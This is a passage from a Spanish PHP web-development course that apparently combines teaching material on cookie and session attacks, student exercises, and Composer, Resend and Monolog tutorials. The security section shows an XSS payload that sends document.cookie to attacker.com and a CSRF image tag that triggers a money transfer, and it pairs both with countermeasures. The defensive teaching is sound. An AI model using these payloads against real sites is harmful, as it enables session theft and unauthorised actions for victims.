(XSS)","text":"<p>Los ataques XSS aprovechan vulnerabilidades en el c\u00f3digo para inyectar scripts maliciosos en p\u00e1ginas web visitadas por otros usuarios. Estos scripts pueden acceder a las cookies de sesi\u00f3n y enviarlas al atacante.</p> <p>Ejemplo:</p> <pre><code>&lt;input type=\"text\" name=\"comentario\" value=\"&lt;script&gt;fetch('https://attacker.com?cookie=' + document.cookie)&lt;/script&gt;\"&gt;\n</code></pre> <p>El c\u00f3digo inyectado env\u00eda la cookie de sesi\u00f3n a una URL controlada por el atacante.</p> <p>Contramedidas:</p> <ul> <li>Escapar y sanear entradas: Utiliza funciones como <code>htmlspecialchars()</code> en PHP para escapar caracteres especiales.</li> </ul> <pre><code>$comentario = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');\n</code></pre> <ul> <li>Pol\u00edtica de Seguridad de Contenidos (CSP): Implementa CSP para restringir el origen de scripts.</li> </ul> <pre><code>Content-Security-Policy: script-src 'self';\n</code></pre>"},{"location":"04web.html#2-ataque-de-man-in-the-middle-mitm","title":"2. Ataque de Man-in-the-Middle (MitM)","text":"<p>Si el sitio no utiliza HTTPS, un atacante puede interceptar el tr\u00e1fico y capturar cookies de sesi\u00f3n no cifradas.</p> <p>Ejemplo: El atacante usa herramientas como Wireshark para capturar cookies en una red p\u00fablica.</p> <p>Contramedidas:</p> <ul> <li>Usar HTTPS: Asegura que todas las conexiones sean a trav\u00e9s de HTTPS.</li> <li>Configurar cookies como <code>Secure</code>:</li> </ul> <pre><code>session_set_cookie_params(['secure' =&gt; true]);\n</code></pre>"},{"location":"04web.html#3-robo-de-cookies-con-ingenieria-social-o-phishing","title":"3. Robo de Cookies con Ingenier\u00eda Social o Phishing","text":"<p>El atacante enga\u00f1a al usuario para que acceda a un enlace malicioso y revela su cookie de sesi\u00f3n.</p> <p>Ejemplo: El atacante env\u00eda un enlace de phishing simulando la p\u00e1gina de inicio de sesi\u00f3n.</p> <p>Contramedidas:</p> <ul> <li>Educaci\u00f3n sobre phishing: Ense\u00f1a a los usuarios a identificar sitios y correos fraudulentos.</li> <li>Autenticaci\u00f3n de dos factores (2FA): A\u00f1ade una capa extra de seguridad.</li> </ul> <pre><code>// Ejemplo usando una biblioteca de 2FA como Google Authenticator\nrequire 'vendor/autoload.php';\n</code></pre>"},{"location":"04web.html#4-cross-site-request-forgery-csrf","title":"4. Cross-Site Request Forgery (CSRF)","text":"<p>CSRF explota la confianza del navegador para realizar solicitudes no autorizadas en nombre del usuario autenticado.</p> <p>Ejemplo: Un enlace malicioso ejecuta una solicitud usando la sesi\u00f3n activa del usuario.</p> <pre><code>&lt;img src=\"https://tusitio.com/transferir?monto=100&amp;cuenta=atacante\"&gt;\n</code></pre> <p>Contramedidas:</p> <ul> <li>Uso de tokens CSRF:</li> </ul> <pre><code>// Generar token\n$_SESSION['csrf_token'] = bin2hex(random_bytes(32));\necho '&lt;input type=\"hidden\" name=\"csrf_token\" value=\"'.$_SESSION['csrf_token'].'\"&gt;';\n\n// Validar token\nif ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {\n    die('Solicitud inv\u00e1lida');\n}\n</code></pre> <ul> <li>Configurar cookies con <code>SameSite</code>:</li> </ul> <pre><code>session_set_cookie_params(['samesite' =&gt; 'Strict']);\n</code></pre>"},{"location":"04web.html#46-referencias","title":"4.6 Referencias","text":"<ul> <li>Cookies en PHP</li> <li>Manejo de sesiones en PHP</li> </ul>"},{"location":"04web.html#47-actividades","title":"4.7 Actividades","text":""},{"location":"04web.html#variables-de-servidor","title":"Variables de servidor","text":"<ol> <li><code>401server.php</code>: igual que el ejemplo visto en los apuntes, muestra los valores de <code>$_SERVER</code> al ejecutar un script en tu ordenador. Prueba a pasarle par\u00e1metros por GET (y a no pasarle ninguno). Prepara un formulario (<code>401post.html</code>) que haga un env\u00edo por POST y compru\u00e9balo de nuevo. Crea una p\u00e1gina (<code>401enlace.html</code>) que tenga un enlace a <code>401server.php</code> y comprueba el valor de <code>HTTP_REFERER</code>.</li> </ol>"},{"location":"04web.html#formularios","title":"Formularios","text":"<ol> <li> <p><code>402formulario.html</code> y <code>402formulario.php</code>: Crea un formulario que solicite:</p> <ul> <li>Nombre y apellidos.</li> <li>Email.</li> <li>URL p\u00e1gina personal.</li> <li>Sexo (radio).</li> <li>N\u00famero de convivientes en el domicilio.</li> <li>Aficiones (checkboxes) \u2013 poner m\u00ednimo 4 valores.</li> <li>Men\u00fa favorito (lista selecci\u00f3n m\u00faltiple) \u2013 poner m\u00ednimo 4 valores.</li> </ul> <p>Muestra los valores cargados en una tabla-resumen.</p> </li> <li> <p><code>403validacion.php</code>: A partir del formulario anterior, introduce validaciones en HTML mediante el atributo <code>required</code> de los campos (uso los tipos adecuados para cada campo), y comprueba que los tipos de los datos cumplen los valores esperados (por ejemplo, en los checkboxes que los valores recogidos forman parte de todos los posibles). Puedes probar a pasarle datos erroneos via URL y comprobar su comportamiento. Tip: Investiga el uso de la funci\u00f3n <code>filter_var</code>.</p> </li> <li> <p><code>404subida.html</code> y <code>404subida.php</code>: Crea un formulario que permita subir un archivo al servidor. Adem\u00e1s del fichero, debe pedir en el mismo formulario dos campos num\u00e9ricos que soliciten la anchura y la altura. Comprueba que tanto el fichero como los datos llegan correctamente.</p> </li> <li> <p><code>405subidaImagen.php</code>: Modifica el ejercicio anterior para que \u00fanicamente permita subir im\u00e1genes (comprueba la propiedad <code>type</code> del archivo subido). Si el usuario selecciona otro tipo de archivos, se le debe informar del error y permitir que suba un nuevo archivo. En el caso de subir el tipo correcto, visualizar la imagen con el tama\u00f1o de anchura y altura recibido como par\u00e1metro.</p> </li> </ol>"},{"location":"04web.html#cookies-y-sesion","title":"Cookies y Sesi\u00f3n","text":"<ol> <li> <p><code>406aceptarCookies.php</code>: Nada m\u00e1s aterrizar en la p\u00e1gina informa al usuario que debe aceptar las cookies para acceder al contenido. Crea un enlace para ello que env\u00ede a la misma p\u00e1gina por GET la variable <code>aceptar</code> y cuando se reciba, crees la cookie. En el contenido muestra una imagen cualquiera en el caso de que exista la cookie.</p> </li> <li> <p><code>407contadorVisitas.php</code>: Mediante el uso de cookies, informa al usuario de si es su primera visita, o si no lo es, muestre su valor (valor de un contador). Adem\u00e1s, debes permitir que el usuario reinicie su contador de visitas.</p> </li> <li> <p><code>408fondo.php</code>: Mediante el uso de cookies, crea una p\u00e1gina con un desplegable con varios colores, de manera que el usuario pueda cambiar el color de fondo de la p\u00e1gina (utiliza estilos CSS en la misma p\u00e1gina). Al cerrar la p\u00e1gina, \u00e9sta debe recordar, al menos durante 24h, el color elegido y la pr\u00f3xima vez que se cargue la pagina, lo haga con el \u00faltimo color seleccionado.</p> </li> <li> <p><code>409fondoSesion1.php</code>: Modifica el ejercicio anterior para almacenar el color de fondo en la sesi\u00f3n y no emplear cookies. Adem\u00e1s, debe contener un enlace al siguiente archivo.     <code>409fondoSesion2.php</code>: Debe mostrar el color y dar la posibilidad de:</p> <ul> <li>volver a la p\u00e1gina anterior mediante un enlace</li> <li>y mediante otro enlace, vaciar la sesi\u00f3n y volver a la p\u00e1gina anterior.</li> </ul> </li> <li> <p>Haciendo uso de la sesi\u00f3n, vamos a dividir el formulario del ejercicio <code>402formulario.php</code> en 2 subformularios:</p> <ul> <li><code>410formulario1.php</code> env\u00eda los datos (nombre y apellidos, email, url y sexo) a <code>410formulario2.php</code>.</li> <li><code>410formulario2.php</code> lee los datos y los mete en la sesi\u00f3n. A continuaci\u00f3n, muestra el resto de campos del formulario a rellenar (convivientes, aficiones y men\u00fa). Env\u00eda estos datos a <code>410formulario3.php</code>.</li> <li><code>410formulario3.php</code> recoge los datos enviados en el paso anterior y junto a los que ya estaban en la sesi\u00f3n, se muestran todos los datos en una tabla/lista desordenada.</li> </ul> </li> </ol>"},{"location":"04web.html#autenticacion","title":"Autenticaci\u00f3n","text":"<p>En los siguientes ejercicios vamos a montar una estructura de inicio de sesi\u00f3n similar a la vista en los apuntes.</p> <ol> <li><code>411index.php</code>: formulario de inicio de sesi\u00f3n</li> <li><code>412login.php</code>: hace de controlador, por lo que debe comprobar los datos recibidos (solo permite la entrada de <code>usuario/usuario</code> y si todo es correcto, ceder el control a la vista del siguiente ejercicio. No contiene c\u00f3digo HTML.</li> <li><code>413peliculas.php</code>: vista que muestra como t\u00edtulo \"Listado de Pel\u00edculas\", y una lista desordenada con tres pel\u00edculas.</li> <li><code>414logout.php</code>: vac\u00eda la sesi\u00f3n y nos lleva de nuevo al formulario de inicio de sesi\u00f3n. No contiene c\u00f3digo HTML.</li> <li><code>415series.php</code>: A\u00f1ade un nueva vista similar a <code>413peliculas.php</code> que muestra un \"Listado de Series\" con una lista desordenada con tres series. Tanto <code>413peliculas.php</code> como la vista recien creadas, deben tener un peque\u00f1o men\u00fa (sencillo, mediante enlaces) que permita pasar de un listado a otro. Comprueba que si se accede directamente a cualquiera de las vistas sin tener un usuario logueado via URL del navegador, no se muestra el listado.</li> <li>Modifica tanto el controlador como las vistas para que:<ul> <li>los datos los obtenga el controlador (almacena en la sesi\u00f3n un array de pel\u00edculas y otro de series)</li> <li>coloque los datos en la sesi\u00f3n</li> <li>En las vistas, los datos se recuperan de la sesi\u00f3n y se pintan en la lista desordenada recorriendo el array correspondiente.</li> </ul> </li> <li>Selecciona uno de los mecanismos de autenticaci\u00f3n vistos en el punto 4.5 y realiza un sistema de login utiliz\u00e1ndolo. </li> </ol>"},{"location":"04web.html#proyecto-videoclub-30","title":"Proyecto Videoclub 3.0","text":"<ol> <li> <p>Para el Videoclub, vamos a crear una p\u00e1gina <code>index.php</code> con un formulario que contenga un formulario de login/password. Se comprobar\u00e1n los datos en <code>login.php</code>. Los posibles usuarios son admin/admin o usuario/usuario.</p> <ul> <li>Si el usuario es correcto, en <code>main.php</code> mostrar un mensaje de bienvenida con el nombre del usuario, junto a un enlace para cerrar la sesi\u00f3n, que lo llevar\u00eda de nuevo al login.</li> <li>Si el usuario es incorrecto, debe volver a cargar el formulario dando informaci\u00f3n al usuario de acceso incorrecto.</li> </ul> </li> <li> <p>Si el usuario es administrador, se cargar\u00e1n en la sesi\u00f3n los datos de soportes y clientes del videoclub que ten\u00edamos en nuestras pruebas (no mediante <code>include</code> sino copiando los datos e insert\u00e1ndolos en un array asociativo, el cual colocaremos posteriormente en la sesi\u00f3n). En unidades posteriores los obtendremos de la base de datos. En <code>mainAdmin.php</code>, adem\u00e1s de la bienvenida, debe mostrar:    * Listado de clientes    * Listado de soportes</p> </li> </ol> Esquema navegaci\u00f3n ejercicio 423 <ol> <li> <p>Vamos a modificar la clase <code>Cliente</code> para almacenar el <code>user</code> y la <code>password</code> de cada cliente. Tras codificar los cambios, modificar el listado de clientes de <code>mainAdmin.php</code> para a\u00f1adir al listado el usuario.</p> </li> <li> <p>Si el usuario que accede no es administrador y coincide con alguno de los clientes que tenemos cargados tras el login, debe cargar <code>mainCliente.php</code> donde se mostrar\u00e1 un listado de los alquileres del cliente. Para ello, modificaremos la clase <code>Cliente</code> para ofrecer el m\u00e9todo <code>getAlquileres() : array</code>, el cual llamaremos y luego recorreremos para mostrar el listado solicitado.</p> </li> </ol> <p>Ahora volvemos a la parte de administraci\u00f3n</p> <ol> <li> <p>Adem\u00e1s de mostrar el listado de clientes, vamos a ofrecer la opci\u00f3n de dar de alta a un nuevo cliente en <code>formCreateCliente.php</code>. Los datos se enviar\u00e1n mediante POST a <code>createCliente.php</code> que los introducir\u00e1 en la sesi\u00f3n. Una vez creado el cliente, debe volver a cargar <code>mainAdmin.php</code> donde se podr\u00e1 ver el cliente insertado. Si hay alg\u00fan dato incorrecto, debe volver a cargar el formulario de alta.</p> </li> <li> <p>Crea en <code>formUpdateCliente.php</code> un formulario que permita editar los datos de un cliente. Debes recoger los datos en <code>updateCliente.php</code>. Los datos de cliente se deben poder modificar desde la propia p\u00e1gina de un cliente, as\u00ed como desde el listado del administrador.</p> </li> <li> <p>Desde el listado de clientes del administrador debes ofrecer la posibilidad de borrar un cliente. En el navegador, antes de redirigir al servidor, el usuario debe confirmar mediante JS que realmente desea eliminar al cliente. Finalmente, en <code>removeCliente.php</code> elimina al cliente de la sesi\u00f3n. Una vez eliminado, debe volver al listado de clientes.</p> </li> </ol> Esquema navegaci\u00f3n Videoclub 3.0"},{"location":"05herramientas.html","title":"Herramientas","text":"Duraci\u00f3n y criterios de evaluaci\u00f3n <p>Duraci\u00f3n estimada: 16 sesiones</p> Resultado de aprendizaje Criterios de evaluaci\u00f3n 4.- Desarrolla aplicaciones Web embebidas en lenguajes de marcas analizando e incorporando funcionalidades seg\u00fan especificaciones. g) Se han utilizado herramientas y entornos para facilitar la programaci\u00f3n, prueba y depuraci\u00f3n del c\u00f3digo. <p>En esta unidad vamos a estudiar algunas de las herramientas m\u00e1s utilizadas en PHP.</p>"},{"location":"05herramientas.html#51-composer","title":"5.1 Composer","text":"Logo Composer <p>Herramienta por excelencia en PHP para la gesti\u00f3n de librer\u00edas y dependencias, de manera que instala y las actualiza asegurando que todo el equipo de desarrollo tiene el mismo entorno y versiones. Adem\u00e1s, ofrece autoloading de nuestro c\u00f3digo, de manera que no tengamos que hacerlo nosotros \"a mano\".</p> <p>Est\u00e1 escrito en PHP, y pod\u00e9is consultar toda su documentaci\u00f3n en https://getcomposer.org/.</p> <p>Utiliza Packagist como repositorio de librer\u00edas.</p> <p>Funcionalmente, es similar a Maven (Java) / npm (JS).</p>"},{"location":"05herramientas.html#instalacion","title":"Instalaci\u00f3n","text":"<p>Si estamos usando XAMPP, hemos de instalar Composer en el propio sistema operativo. Se recomienda seguir las instrucciones oficiales seg\u00fan el sistema operativo a emplear.</p> <p>En cambio, si usamos Docker, necesitamos modificar la configuraci\u00f3n de nuestro contenedor. En nuestro caso, hemos decidido modificar el archivo <code>Dockerfile</code> y a\u00f1adir el siguiente comando:</p> <pre><code>COPY --from=composer:2.0 /usr/bin/composer /usr/local/bin/composer\n</code></pre> <p>Para facilitar el trabajo, hemos creado una plantilla ya preparada.</p> <p>Es importante que dentro del contenedor comprobemos que tenemos la v2:</p> <pre><code>composer -V\n</code></pre>"},{"location":"05herramientas.html#inicializar-proyecto","title":"Inicializar proyecto","text":"<p>Cuando creemos un proyecto por primera vez, hemos de inicializar el repositorio. Para ello, en el directorio del proyecto ejecutaremos el comando <code>composer init</code> donde:</p> <ul> <li>Configuramos el nombre del paquete, descripci\u00f3n, autor (formato: nombre ), tipo de paquete (project), etc... <li>Definimos las dependencias del proyecto (<code>require</code>) y las de desarrollo (<code>require-dev</code>) de manera interactiva.<ul> <li>En las de desarrollo se indica aquellas que no se instalar\u00e1n en el entorno de producci\u00f3n, por ejemplo, las librer\u00edas de pruebas.</li> </ul> </li> <p>Tras su configuraci\u00f3n, se crear\u00e1 autom\u00e1ticamente el archivo <code>composer.json</code> con los datos introducidos y descarga las librer\u00edas en la carpeta <code>vendor</code>. La instalaci\u00f3n de las librer\u00edas siempre se realiza de manera local para cada proyecto.</p> <pre><code>{\n    \"name\": \"dwes/log\",\n    \"description\": \"Pruebas de Monolog\",\n    \"type\": \"project\",\n    \"require\": {\n        \"monolog/monolog\": \"^3.7\"\n    },\n    \"license\": \"MIT\",\n    \"authors\": [\n        {\n            \"name\": \"Eladio Blanco\",\n            \"email\": \"eladio.blanco@fernando3martos.com\"\n        }\n    ]\n}\n</code></pre> <p>A la hora de indicar cada librer\u00eda introduciremos:</p> <ul> <li>el nombre de la librer\u00eda, compuesta tanto por el creador o \"vendor\", como por el nombre del proyecto. Ejemplos: <code>monolog/monolog</code> o <code>laravel/installer</code>.</li> <li> <p>la versi\u00f3n de cada librer\u00eda. Tenemos diversas opciones para indicarla:</p> <ul> <li>Directamente: 1.4.2</li> <li>Con comodines: 1.*</li> <li>A partir de: &gt;= 2.0.3</li> <li>Sin rotura de cambios: ^1.3.2 // &gt;=1.3.2 &lt;2.0.0</li> </ul> </li> </ul>"},{"location":"05herramientas.html#actualizar-librerias","title":"Actualizar librer\u00edas","text":"<p>Podemos definir las dependencias via el archivo <code>composer.json</code> o mediante comandos con el formato <code>composer require vendor/package:version</code>. Por ejemplo, si queremos a\u00f1adir phpUnit como librer\u00eda de desarrollo, haremos:</p> <pre><code>composer require phpunit/phpunit \u2013dev\n</code></pre> <p>Tras a\u00f1adir nuevas librer\u00edas, hemos de actualizar nuestro proyecto:</p> <pre><code>composer update\n</code></pre> <p>Si creamos el archivo <code>composer.json</code> nosotros directamente sin inicializar el repositorio, hemos de instalar las dependencias:</p> <pre><code>composer install\n</code></pre> <p>Al hacer este paso (tanto instalar como actualizar), como ya hemos comentado, se descargan las librer\u00edas en dentro de la carpeta <code>vendor</code>. Es muy importante a\u00f1adir esta carpeta al archivo <code>.gitignore</code> para no subirlas a GitHub.</p> <p>Adem\u00e1s se crea el archivo <code>composer.lock</code>, que almacena la versi\u00f3n exacta que se ha instalado de cada librer\u00eda (este archivo no se toca).</p>"},{"location":"05herramientas.html#autoloadphp","title":"<code>autoload.php</code>","text":"<p>Composer crea de forma autom\u00e1tica en <code>vendor/autoload.php</code> el c\u00f3digo para incluir de forma autom\u00e1tica todas las librer\u00edas que tengamos configuradas en <code>composer.json</code>.</p> <p>Para utilizarlo, en la cabecera de nuestro archivos pondremos:</p> <pre><code>&lt;?php\nrequire 'vendor/autoload.php';\n</code></pre> <p>En nuestro caso, de momento s\u00f3lo lo pondremos en los archivos donde probamos las clases</p> <p>Si queremos que Composer tambi\u00e9n se encargue de cargar de forma autom\u00e1tica nuestras clases de dominio (o cualquier c\u00f3digo que est\u00e9 en otra carpeta diferente a <code>vendor</code>), dentro del archivo <code>composer.json</code>, definiremos la propiedad <code>autoload</code>:</p> <pre><code>\"autoload\": {\n    \"psr-4\": {\"App\\\\\": \"app/\"} // App\\\\ es OPCIONAL (si queremos tener un namespace base)\n},\n</code></pre> <p>Y desde el directorio del <code>composer.json</code> lanzamos sel siguiente comando para volver a generar el autoload:</p> <pre><code>composer dump-autoload\n</code></pre> <p>PSR-4 es una especificaci\u00f3n para la auto carga de clases desde la ruta de los archivos. En el ejemplo anterior se indica que cualquier clase definida bajo el namespace App se buscar\u00e1 en el directorio app/. Por ejemplo, <code>App\\Clases\\Cliente</code> se corresponde con el archivo <code>app/Clases/Cliente.php</code>.</p> <p>En <code>Cliente.php</code> tendr\u00edamos que definir su namespace: </p> <pre><code>namespace App\\Clases;\n</code></pre> <p>Y en el <code>index.php</code> en la ra\u00edz del proyecto podr\u00edamos usar la clase as\u00ed:</p> <pre><code>use App\\Clases\\Cliente;\n</code></pre>"},{"location":"05herramientas.html#52-resend","title":"5.2 Resend","text":"<p>Vamos a probar Composer a\u00f1adiendo la librer\u00eda de Resend a nuestro proyecto. Se trata de una API para enviar correos electr\u00f3nicos en multitud de lenguajes.</p> <p>Para ello, incluiremos la librer\u00eda en nuestro proyecto y actualizamos:</p> <pre><code>composer require resend/resend-php\ncomposer update\n</code></pre> <p>Prerrequisitos: Crear API key y verificar dominio</p> <p>Es importante seguir estas instrucciones previas para crear la API key propia que utilizaremos en el proyecto y opcionalmente verificar el dominio si queremos enviar correos con nuestra direcci\u00f3n de correo como remitente.</p> <p>Y una vez tengamos la API key, con este c\u00f3digo de prueba enviar\u00edamos un correo:</p> <pre><code>&lt;?php\n\nrequire_once __DIR__ . '/vendor/autoload.php';\n\n$resend = Resend::client('NUESTRA API KEY');\n\n$resend-&gt;emails-&gt;send([\n  'from' =&gt; 'Eladio Dev &lt;onboarding@resend.dev&gt;', // No tocar este correo si no tenemos el domino verificado\n  'to' =&gt; ['eladio.blanco@fernando3martos.com'],\n  'subject' =&gt; 'Env\u00edo desde Resend',\n  'html' =&gt; '&lt;strong&gt;Funciona!&lt;/strong&gt;',\n]);\n</code></pre>"},{"location":"05herramientas.html#alternativas","title":"Alternativas","text":"<p>Otras alternativas para el env\u00edo de correos electr\u00f3nicos son:</p> <ul> <li>Utilizar directamente la funci\u00f3n <code>mail()</code> de PHP (necesario servidor SMTP configurado).</li> <li>Usar librer\u00edas como PHPMailer, Swift Mailer o Simfony Mailer para enviar correos desde servidor SMTP propio o externo como Gmail. Ideales para proyectos peque\u00f1os.</li> <li>Usar servicios en la nube como SendGrid, Mailgun, o Amazon SES para env\u00edos masivos o producci\u00f3n.</li> <li>Para pruebas, usar herramientas como Mailtrap, que permiten interceptar los correos para ver c\u00f3mo se ver\u00edan en la bandeja de entrada sin enviarlos de verdad. </li> </ul>"},{"location":"05herramientas.html#53-monolog","title":"5.3 Monolog","text":"<p>De nuevo, mediante Composer toca a\u00f1adir la librer\u00eda Monolog a nuestro proyecto. Se trata de un librer\u00eda para la gesti\u00f3n de logs de nuestras aplicaciones, soportando diferentes niveles (info, warning, etc...), salidas (ficheros, sockets, BBDD, Web Services, email, etc) y formatos (texto plano, HTML, JSON, etc...).</p> <p>Para ello, incluiremos la librer\u00eda en nuestro proyecto y actualizamos:</p> <pre><code>composer require monolog/monolog\ncomposer update\n</code></pre> <p>Monolog 2 requiere al menos PHP 7.2, cumple con el estandar de logging PSR-3, y es la librer\u00eda empleada por Laravel y Symfony para la gesti\u00f3n de logs.</p> <p>Cuando usar un log</p> <ul> <li>Seguir las acciones/movimientos de los usuarios</li> <li>Registrar las transacciones</li> <li>Rastrear los errores de usuario</li> <li>Fallos/avisos a nivel de sistema</li> <li>Interpretar y coleccionar datos para posterior investigaci\u00f3n de patrones</li> </ul>"},{"location":"05herramientas.html#niveles","title":"Niveles","text":"<p>A continuaci\u00f3n mostramos los diferentes niveles de menos a m\u00e1s restrictivo:</p> <ul> <li>debug -100: Informaci\u00f3n detallada con prop\u00f3sitos de debug. No usar en entornos de producci\u00f3n.</li> <li>info - 200: Eventos interesantes como el inicio de sesi\u00f3n de usuarios.</li> <li>notice - 250: Eventos normales pero significativos.</li> <li>warning - 300: Ocurrencias excepcionales que no llegan a ser error.</li> <li>error - 400: Errores de ejecuci\u00f3n que permiten continuar con la ejecuci\u00f3n de la aplicaci\u00f3n pero que deben ser monitorizados.</li> <li>critical - 500: Situaciones importantes donde se generan excepciones no esperadas o no hay disponible un componente.</li> <li>alert - 550: Se deben tomar medidas inmediatamente. Ca\u00edda completa de la web, base de datos no disponible, etc... Adem\u00e1s, se suelen enviar mensajes por email.</li> <li>emergency - 600: Es el error m\u00e1s grave e indica que todo el sistema est\u00e1 inutilizable.</li> </ul>"},{"location":"05herramientas.html#prueba-monolog","title":"Prueba Monolog","text":"<p>Por ejemplo, en el archivo <code>pruebaLog.php</code> que colocar\u00edamos en la ra\u00edz, primero incluimos el autoload, importamos las clases a utilizar para finalmente usar los m\u00e9todos de Monolog y consultar la salida de los logs en el archivo <code>logs/milog.log</code> que se crea autom\u00e1ticamente:</p> <pre><code>&lt;?php\ninclude __DIR__ .\"/vendor/autoload.php\";\n\nuse Monolog\\Logger;\nuse Monolog\\Level;\nuse Monolog\\Handler\\StreamHandler;\n\n$log = new Logger(\"MiLogger\");\n$log-&gt;pushHandler(new StreamHandler(\"logs/milog.log\", Level::Debug));\n\n$log-&gt;debug(\"Esto es un mensaje de DEBUG\");\n$log-&gt;info(\"Esto es un mensaje de INFO\");\n$log-&gt;warning(\"Esto es un mensaje de WARNING\");\n$log-&gt;error(\"Esto es un mensaje de ERROR\");\n$log-&gt;critical(\"Esto es un mensaje de CRITICAL\");\n$log-&gt;alert(\"Esto es un mensaje de ALERT\");\n</code></pre> <p>En todos los m\u00e9todos de registro de mensajes (<code>debug</code>, <code>info</code>, ...), adem\u00e1s del propio mensaje, le podemos pasar informaci\u00f3n como el contenido de alguna variable, usuario de la aplicaci\u00f3n, etc.. como segundo par\u00e1metro dentro de un array, el cual se conoce como array de contexto. Es conveniente hacerlo mediante un array asociativo para facilitar la lectura del log.</p> <pre><code>&lt;?php\n$log-&gt;warning(\"Producto no encontrado\", [$producto]);\n$log-&gt;warning(\"Producto no encontrado\", [\"datos\" =&gt; $producto]);\n</code></pre>"},{"location":"05herramientas.html#funcionamiento","title":"Funcionamiento","text":"<p>Cada instancia <code>Logger</code> tiene un nombre de canal (MiLogger en el ejemplo anterior) y una pila de manejadores (handler). Cada mensaje que mandamos al log atraviesa la pila de manejadores, y cada uno decide si debe registrar la informaci\u00f3n si cumple o supera el nivel m\u00ednimo que se haya especificado, y si se da el caso, finalizar la propagaci\u00f3n. Por ejemplo, un <code>StreamHandler</code> en el fondo de la pila que lo escriba todo en disco, y en el tope a\u00f1ade un <code>MailHandler</code> que env\u00ede un mail s\u00f3lo cuando haya un error.</p>"},{"location":"05herramientas.html#manejadores","title":"Manejadores","text":"<p>Cada manejador tambien tiene un formateador (<code>Formatter</code>). Si no se indica ninguno, se le asigna uno por defecto. El \u00faltimo manejador insertado ser\u00e1 el primero en ejecutarse. Luego se van ejecutando conforme a la pila.</p> <p>Los manejadores m\u00e1s utilizados son:</p> <ul> <li><code>StreamHandler(ruta, nivel)</code>: Escribe los logs en un \"stream\" (flujo) espec\u00edfico, como un archivo en el sistema de archivos o la salida est\u00e1ndar (php://stdout) o la de error (php://stderr).</li> <li><code>RotatingFileHandler(ruta, maxFiles, nivel)</code>: Guarda los registros en archivos que se rotan autom\u00e1ticamente seg\u00fan un intervalo de tiempo (por defecto diario).</li> <li><code>NativeMailerHandler(para, asunto, desde, nivel)</code>: Env\u00eda los mensajes de log a una direcci\u00f3n de correo electr\u00f3nico usando la funci\u00f3n mail() de PHP (necesario servidor SMTP configurado).</li> <li><code>FirePHPHandler(nivel)</code>: Env\u00eda los logs a la consola de FirePHP (extensi\u00f3n del navegador) a trav\u00e9s de las cabeceras HTTP que intercepta. \u00datil para desarrollo.</li> </ul> <p>Si queremos que los mensajes de la aplicaci\u00f3n salgan por el log del servidor,  en nuestro caso el archivo <code>error.log</code> de Apache utilizaremos como ruta la salida de error:</p> <pre><code>&lt;?php\n// error.log\n$log-&gt;pushHandler(new StreamHandler(\"php://stderr\", Level::Debug));\n</code></pre> <p>FirePHP</p> <p>Por ejemplo, mediante <code>FirePHPHandler</code>, podemos utilizar FirePHP, la cual es una herramienta para hacer debug en la consola de Firefox o Chrome. Tras instalar la extensi\u00f3n en Firefox, habilitar las opciones y configurar el Handler, podemos ver los mensajes coloreados con sus datos:</p> <pre><code>&lt;?php\n$log = new Logger(\"MiFirePHPLogger\");\n$log-&gt;pushHandler(new FirePHPHandler(Level::Info));\n\n$datos = [\"real\" =&gt; \"Bruce Wayne\", \"personaje\" =&gt; \"Batman\"];\n$log-&gt;debug(\"Esto es un mensaje de DEBUG\", $datos);\n$log-&gt;info(\"Esto es un mensaje de INFO\", $datos);\n$log-&gt;warning(\"Esto es un mensaje de WARNING\", $datos);\n// ...\n</code></pre> <p> Ejemplo de uso de FirePHP </p>"},{"location":"05herramientas.html#canales","title":"Canales","text":"<p>Se les asigna al crear el <code>Logger</code>. En grandes aplicaciones, se crea un canal por cada subsistema para identificar el origen de los logs: ventas, contabilidad, almac\u00e9n. No es una buena pr\u00e1ctica usar el nombre de la clase como canal, esto se hace con un procesador.</p> <p>Es recomendable utilizar el log como una propiedad privada de la clase que nos interese, asignando el canal, manejadores y formato en el propio constructor de la clase.</p> <pre><code>&lt;?php\n// Propiedad log privada de la clase configurada con el canal 'MiApp'\n$this-&gt;log = new Logger(\"MiApp\");\n$this-&gt;log-&gt;pushHandler(new StreamHandler(\"logs/milog.log\", Level::Debug));\n$this-&gt;log-&gt;pushHandler(new FirePHPHandler(Level::Debug));\n</code></pre> <p>Y dentro de los m\u00e9todos de la clase, para escribir en el log har\u00edamos algo as\u00ed:</p> <pre><code>&lt;?php\n$this-&gt;log-&gt;warning(\"Producto no encontrado\", [$producto]);\n</code></pre>"},{"location":"05herramientas.html#procesadores","title":"Procesadores","text":"<p>Los procesadores son componentes que permiten modificar o agregar informaci\u00f3n adicional a cada mensaje de log antes de que este sea enviado a su destino final por el handler. Para ello, se apilan despu\u00e9s de cada manejador mediante el m\u00e9todo <code>pushProcessor($procesador)</code>.</p> <p>Algunos procesadores conocidos son <code>IntrospectionProcessor</code> (muestran la linea, fichero, clase y metodo desde el que se invoca el log), <code>WebProcessor</code> (a\u00f1ade la URI, m\u00e9todo e IP) o <code>GitProcessor</code> (a\u00f1ade la rama y el commit).</p> <p>Se pueden combinar entre s\u00ed para mostrar la informaci\u00f3n de cada uno de ellos en cada log.</p> PHPConsola en formato texto <pre><code>&lt;?php\nuse Monolog\\Logger;\nuse Monolog\\Level;\nuse Monolog\\Handler\\StreamHandler;\nuse Monolog\\Handler\\FirePHPHandler;\nuse Monolog\\Processor\\IntrospectionProcessor;\nuse Monolog\\Processor\\WebProcessor;\n\n// Crear logger con canal \"MiLogger\"\n$log = new Logger(\"MiLogger\");\n\n// Manejadores de logs\n$log-&gt;pushHandler(new StreamHandler(\"logs/milog.log\", Level::Debug));\n$log-&gt;pushHandler(new FirePHPHandler(Level::Info));\n\n// Procesadores para a\u00f1adir/modificar informaci\u00f3n de los logs\n$log-&gt;pushProcessor(new IntrospectionProcessor());\n$log-&gt;pushProcessor(new WebProcessor());\n\n// Mensaje de log\n$log-&gt;debug(\"Esto es un mensaje de DEBUG\");\n</code></pre> <pre><code>[2024-11-05T18:59:32.512183+01:00] MiLogger.DEBUG: Esto es un mensaje de DEBUG [] {\"url\":\"/t05/01composer/pruebaLog.php\",\"ip\":\"192.168.65.1\",\"http_method\":\"GET\",\"server\":\"localhost\",\"referrer\":\"http://localhost/t05/01composer/pruebaLog.php\",\"file\":\"/var/www/html/t05/01composer/pruebaLog.php\",\"line\":19,\"class\":null,\"callType\":null,\"function\":null}\n</code></pre> <p>Tambi\u00e9n es posible a\u00f1adir un procesador como una funci\u00f3n. En el siguiente ejemplo se a\u00f1ade la IP del usuario:</p> PHPConsola en formato texto 